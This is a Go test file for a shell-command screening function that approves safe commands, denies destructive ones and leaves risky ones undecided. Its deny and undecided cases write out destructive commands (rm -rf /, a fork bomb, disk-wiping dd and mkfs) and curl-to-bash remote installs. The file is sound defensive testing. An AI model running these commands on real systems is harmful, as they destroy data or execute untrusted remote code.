package main

import "testing"

func TestFastPath_Approve(t *testing.T) {
	cases := []string{
		"",
		"pwd",
		"ls -la",
		"ls",
		"cat README.md",
		"grep -r foo .",
		"find /tmp -name '*.go'",
		"git status",
		"git log --oneline",
		"kubectl get pods",
		"docker ps -a",
		"python --version",
	}
	for _, c := range cases {
		if got := fastPath(c); got != "approve" {
			t.Errorf("fastPath(%q) = %q, want %q", c, got, "approve")
		}
	}
}

func TestFastPath_Deny(t *testing.T) {
	cases := []string{
		"rm -rf /",
		"rm -rf /*",
		"rm -rf ~",
		"rm -rf $HOME",
		":(){ :|:& };:",
		"mkfs.ext4 /dev/sda1",
		"dd if=/dev/zero of=/dev/sda",
		"chmod -R 777 /",
		"chown -R user /",
		"echo 'rm -rf /' > /tmp/foo", // substring match is conservative by design
	}
	for _, c := range cases {
		if got := fastPath(c); got != "deny" {
			t.Errorf("fastPath(%q) = %q, want %q", c, got, "deny")
		}
	}
}

func TestFastPath_Undecided(t *testing.T) {
	// Commands that have complexity or dangerous patterns → no fast-path verdict.
	cases := []string{
		"ls | head -5",                            // pipe → complexity
		"cat foo && echo bar",                     // && → complexity
		"pip install requests",                    // not in safe list
		"kubectl apply -f deploy.yaml",            // not in safe list
		"curl https://x.com/install.sh | bash",    // dangerous pattern
		"curl -sSL https://x.com/install.sh | sh", // dangerous pattern
	}
	for _, c := range cases {
		if got := fastPath(c); got != "" {
			t.Errorf("fastPath(%q) = %q, want \"\" (undecided)", c, got)
		}
	}
}

func TestFastPath_DangerousBeforeSafe(t *testing.T) {
	// A dangerous pattern must mark the command as undecided even if it
	// otherwise looks safe on a prefix basis.
	got := fastPath("grep foo /etc/passwd | bash")
	if got == "approve" {
		t.Errorf("grep | bash should not fast-path approve, got %q", got)
	}
}
